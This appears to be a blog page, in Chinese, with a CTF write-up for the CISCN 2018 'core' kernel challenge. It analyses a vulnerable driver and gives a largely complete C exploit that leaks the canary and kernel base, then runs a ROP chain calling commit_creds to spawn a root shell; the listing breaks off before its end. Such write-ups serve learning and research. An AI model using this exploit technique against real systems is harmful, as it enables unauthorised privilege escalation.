@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="P4nda" />
+
+
+
+<meta name="description" content="最近刚开始学习内核PWN相关的东西， 把2018年国赛的一道简单内核题作为我的第一道KERNEL PWN，虽然比赛已经过去好久了...">
+<meta name="keywords" content="CTF,PWN,KERNEL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【kernel pwn】CISCN 2018 CTF core题解">
+<meta property="og:url" content="http://p4nda.top/2018/07/13/ciscn2018-core/index.html">
+<meta property="og:site_name" content="p4nda&#39;s blog">
+<meta property="og:description" content="最近刚开始学习内核PWN相关的东西， 把2018年国赛的一道简单内核题作为我的第一道KERNEL PWN，虽然比赛已经过去好久了...">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/1-1.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/1-2.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/1-3.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/1-4.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/2-1.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/2-2.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/2-3.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/2-4.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/2-5.png">
+<meta property="og:image" content="http://p4nda.top/img/QWB_core/0.png">
+<meta property="og:updated_time" content="2018-07-13T03:37:34.275Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【kernel pwn】CISCN 2018 CTF core题解">
+<meta name="twitter:description" content="最近刚开始学习内核PWN相关的东西， 把2018年国赛的一道简单内核题作为我的第一道KERNEL PWN，虽然比赛已经过去好久了...">
+<meta name="twitter:image" content="http://p4nda.top/img/QWB_core/1-1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="p4nda&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/p4nda.jpeg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>【kernel pwn】CISCN 2018 CTF core题解 | p4nda&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?11859a78d84a58f3a5bac3d2ec5ea89e";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/p4nda.jpeg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">P4nda</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Questions/">Questions</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://0gur1.cc">0gur1</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://tacxingxing.com">Tac1t0rnX</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://p1umer.club/">p1umer</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="//p4nda.top/WooyunDrops/">Wooyun知识库</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">PWNer of Dubhe | PWN &amp; security | byr</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">P4nda</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/p4nda.jpeg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">P4nda</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:root@p4nda.xyz" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://www.weibo.com/3655650510/profile?rightmod=1&wvr=6&mod=personinfo" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/ret2p4nda" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/panda_Z/activities" title="知乎"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="http://www.cnblogs.com/p4nda/" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/381124487" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-ciscn2018-core" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/07/13/ciscn2018-core/" class="article-date">
+      <time datetime="2018-07-13T02:01:41.000Z" itemprop="datePublished">2018-07-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      【kernel pwn】CISCN 2018 CTF core题解
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KERNEL/">KERNEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><a href="https://pan.baidu.com/s/1AIG5vXKOMFIYSGmEdiJNRA" target="_blank" rel="noopener">题目及相关文件下载</a>，密码：914k</p>
+<p>这是一道接近于libc的overflowme的题目了，调试还是比较麻烦，如果大佬们有好用的kernel用gdb插件麻烦告知我一下，环境好容易崩溃啊…</p>
+<h1 id="core"><a href="#core" class="headerlink" title="core"></a>core</h1><h2 id="题目-amp-漏洞分析"><a href="#题目-amp-漏洞分析" class="headerlink" title="题目&amp;漏洞分析"></a>题目&amp;漏洞分析</h2><p>题目中注册了core_write、core_ioctl，而在core_ioctl中会根据参数去调用core_read、core_copy_func函数。</p>
+<p>core_write: 用户可以向全局变量中写入一个不大于0x800的字符串内容</p>
+<p><img src="/img/QWB_core/1-1.png" alt=""></p>
+<p>core_ioctl：分为3个case，维护了一个全局变量，当参数为0x6677889c的时候，可以设置这个变量，其余情况会分别调用core_read、core_copy_func函数</p>
+<p><img src="/img/QWB_core/1-2.png" alt=""></p>
+<p>core_read：会根据core_ioctl维护的全局变量，从栈上读出长度为0x40的数据，这里很显然可以越界读数据，栈上的返回地址、canary之类的都可以读到</p>
+<p><img src="/img/QWB_core/1-3.png" alt=""></p>
+<p>core_copy_func：会根据用户的输入长度，从name这个全局变量中向栈上读出数据。在判断时这个变量的类型是signed long long，而读出的时候变成了signed short，显然存在一个截断，当使用如0xf000000000000300这样的数据就可以绕过限制，造成内核的栈溢出。可以说是为了出题而出题了…</p>
+<p><img src="/img/QWB_core/1-4.png" alt=""></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先检查一下内核的安全保护机制，通过查看start.sh发现没有开启smep，开启了kalsr和canary的。所谓smep是内核为了避免ret2user的利用方法增加的一种保护方法，即内核代码不能跳转到用户空间去执行代码，绕过方法也很简单，使用内核的ROP就可以了，但此题由于没有这个保护，可以直接使用ret2user的攻击方法。</p>
+<p>题目给出的目录结构是这样的：</p>
+<p>core.cpio：这是一个打包的文件，解包以后发现里面有文件系统，其中以vmlinux命名的是内核的二进制文件，core.ko是存在漏洞的驱动，也就是题目分析中分析的二进制文件。</p>
+<p>start.sh： 启动脚本，标明启动的方法、保护措施等</p>
+<p>bzImage：镜像文件</p>
+<p>这里类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的。</p>
+<h3 id="内存地址泄露"><a href="#内存地址泄露" class="headerlink" title="内存地址泄露"></a>内存地址泄露</h3><p>这个漏洞在分析中已经说过了，在ioctl中设置全局变量的值，然后利用core_read函数可以泄露栈上的数据：</p>
+<p>首先先对core驱动下断点，断点的下法是，首先在qemu中查看/sys/module/core/sections/.text文件，找到镜像加载的基地址：</p>
+<p><img src="/img/QWB_core/2-1.png" alt=""></p>
+<p>然后在gdb端，执行<strong><em>add-symbol-file ./core/core.ko 0xffffffffc03a0000</em></strong> ，为驱动增加符号表</p>
+<p><img src="/img/QWB_core/2-2.png" alt=""></p>
+<p>这样就可以下断点了，首先看一下再core_read的栈内容。</p>
+<p><img src="/img/QWB_core/2-3.png" alt=""></p>
+<p>由于kernel pwn 的最终目的是提权到root，一种简单的方法是执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+<p>而commit_creds、prapare_kernel_cred都是内核函数，在vmlinux中，因此还需要泄露vmlinux的基地址。</p>
+<p>而在栈地址中并不能看出来哪个地址属于vmlinux，这里用一个应该算是复杂的方法吧。</p>
+<p>首先找到这两个函数在vmlinux的偏移：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./core/vmlinux'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"commit_creds"</span>,hex(elf.symbols[<span class="string">'commit_creds'</span>]<span class="number">-0xffffffff81000000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"prepare_kernel_cred"</span>,hex(elf.symbols[<span class="string">'prepare_kernel_cred'</span>]<span class="number">-0xffffffff81000000</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QWB_core/2-4.png" alt=""></p>
+<p>在qemu里查看/proc/kallsyms中的 commit_creds 函数地址</p>
+<p><img src="/img/QWB_core/2-5.png" alt=""></p>
+<p>而计算之后，找到vmlinux的基址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Nov <span class="number">20</span> <span class="number">2017</span>, <span class="number">18</span>:<span class="number">23</span>:<span class="number">56</span>) </span><br><span class="line">[GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0xffffffffba89c8e0</span><span class="number">-0x9c8e0</span>)</span><br><span class="line"><span class="string">'0xffffffffba800000L'</span></span><br></pre></td></tr></table></figure>
+<p>可以发现在栈上有一条数据在vmlinux不远处，距离为0x9dd6d1</p>
+<h3 id="控制RIP"><a href="#控制RIP" class="headerlink" title="控制RIP"></a>控制RIP</h3><p>能够泄露vmlinux、驱动和canary了以后，就变得比较容易了。</p>
+<p>首先预先构造好ROP，使用core_write写入到全局变量name中备用。</p>
+<p>执行<strong><em>ROPgadget –binary vmlinux &gt; 1.txt</em></strong>保存gadget备用，这个过程慢到令人发指…</p>
+<p>而在core_copy_func中，构造长度为0xf000000000000300，即可成功覆盖RIP</p>
+<h3 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h3><p>其实，提取过程很容易，流程是：</p>
+<p>1 <strong><em>执行 commit_creds(prepare_kernel_cred(0))</em></strong>，此时该进程已经是id为0的root进程了，但是仍在内核态中。而这条语句的执行可以用ROP来做，由于SMEP没开，ret2user也可以，ret2user就是在编写的程序中写入一个函数调用该函数，将ROP的该部分直接写成用户态函数的地址；</p>
+<p>2 <strong><em>执行swapgs</em></strong>，准备回到用户态</p>
+<p>3 iretq回到用户态，在rsp指向的位置布置好相关寄存器的值，特别的将rip寄存器的值保存为执行system(“/bin/sh”)，再返回用户态后就可以拿到一个root权限的shell了。</p>
+<p><img src="/img/QWB_core/0.png" alt=""></p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setoff</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889C</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889b</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889a</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp	;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">		<span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">		<span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">		<span class="string">"pushfq\n"</span></span><br><span class="line">		<span class="string">"popq %2\n"</span></span><br><span class="line">		:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">"memory"</span></span><br><span class="line"> 	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd ;</span><br><span class="line">	<span class="keyword">size_t</span> tmp ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line">	<span class="keyword">size_t</span> shellcode[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">size_t</span> vmlinux_base,canary,module_core_base;</span><br><span class="line">	<span class="keyword">size_t</span> commit_creds =  <span class="number">0x9c8e0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0x9cce0</span>;</span><br><span class="line">	save_stats();</span><br><span class="line">	fd = open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Open /proc/core error!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	setoff(fd,<span class="number">0x40</span>);</span><br><span class="line">	core_read(fd,buf);</span><br><span class="line">	<span class="comment">/*	for test</span></span><br><span class="line"><span class="comment">	for(int i = 0;i&lt;8;i++)&#123;</span></span><br><span class="line"><span class="comment">		tmp = *(size_t *)(&amp;buf[i*8]);</span></span><br><span class="line"><span class="comment">		printf("[%d] %p\n",i,tmp);</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">size_t</span> pop_rdi = <span class="number">0x000b2f</span>;</span><br><span class="line">	<span class="keyword">size_t</span> push_rax =  <span class="number">0x02d112</span>;</span><br><span class="line">	<span class="keyword">size_t</span> swapgs = <span class="number">0x0d6</span>;</span><br><span class="line">	<span class="keyword">size_t</span> iret ;</span><br><span class="line">	<span class="keyword">size_t</span> xchg = <span class="number">0x16684f0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> call_rax=<span class="number">0x40398</span>;</span><br><span class="line">	<span class="keyword">size_t</span> pop_rcx = <span class="number">0x21e53</span>;</span><br><span class="line">	<span class="keyword">size_t</span> pop_rbp = <span class="number">0x3c4</span>; <span class="comment">//: pop rbp ; ret</span></span><br><span class="line">	<span class="keyword">size_t</span> pop_rdx = <span class="number">0xa0f49</span> ;<span class="comment">//: pop rdx ; ret</span></span><br><span class="line">	<span class="keyword">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0x01aa6a</span>;</span><br><span class="line">	vmlinux_base = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">4</span>*<span class="number">8</span>])<span class="number">-0x1dd6d1</span> );</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] vmlinux_base:%p\n"</span>,vmlinux_base);</span><br><span class="line">	canary = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">0</span>]));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] canary:%p\n"</span>,canary);</span><br><span class="line">	module_core_base = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">2</span>*<span class="number">8</span>])<span class="number">-0x19b</span> );</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] module_core_base:%p\n"</span>,module_core_base);</span><br><span class="line">	commit_creds+=vmlinux_base;</span><br><span class="line">	prepare_kernel_cred += vmlinux_base;</span><br><span class="line">	pop_rdi += vmlinux_base;</span><br><span class="line">	push_rax += vmlinux_base;</span><br><span class="line">	swapgs += module_core_base ;</span><br><span class="line">	iret = <span class="number">0x50ac2</span>+vmlinux_base;</span><br><span class="line">	xchg += vmlinux_base;</span><br><span class="line">	call_rax += vmlinux_base;</span><br><span class="line">	pop_rcx += vmlinux_base;</span><br><span class="line">	mov_rdi_rax_call_rdx +=vmlinux_base;</span><br><span class="line">	pop_rdx += vmlinux_base;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] commit_creds:%p\n"</span>,commit_creds);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+] prepare_kernel_cred:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line">	<span class="comment">//shellcode[0]=shellcode[0]</span></span><br><span class="line">	<span class="comment">//shellcode[] =</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">		shellcode[i]=canary;</span><br><span class="line">	&#125; </span><br><span class="line">	shellcode[<span class="number">9</span>] = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">1</span>]) );</span><br><span class="line">	shellcode[<span class="number">10</span>] = pop_rdi;	<span class="comment">//0xdeadbeefdeadbeef;</span></span><br><span class="line">	shellcode[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">	shellcode[<span class="number">12</span>] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">	shellcode[<span class="number">13</span>] = pop_rdx;</span><br><span class="line">	shellcode[<span class="number">14</span>] = pop_rcx;</span><br><span class="line">	shellcode[<span class="number">15</span>] = mov_rdi_rax_call_rdx;</span><br><span class="line">	shellcode[<span class="number">16</span>] = commit_creds;</span><br><span class="line">	shellcode[<span class="number">17</span>] = swapgs;</span><br><span class="line">	shellcode[<span class="number">18</span>] = shellcode;</span><br><span class="line">	shellcode[<span class="number">19</span>] = iret;</span><br><span class="line">	shellcode[<span class="number">20</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">	shellcode[<span class="number">21</span>] = user_cs;</span><br><span class="line">	shellcode[<span class="number">22</span>] = user_eflags;</span><br><span class="line">	shellcode[<span class="number">23</span>] = user_sp;</span><br><span class="line">	shellcode[<span class="number">24</span>] = user_ss;</span><br><span class="line">	</span><br><span 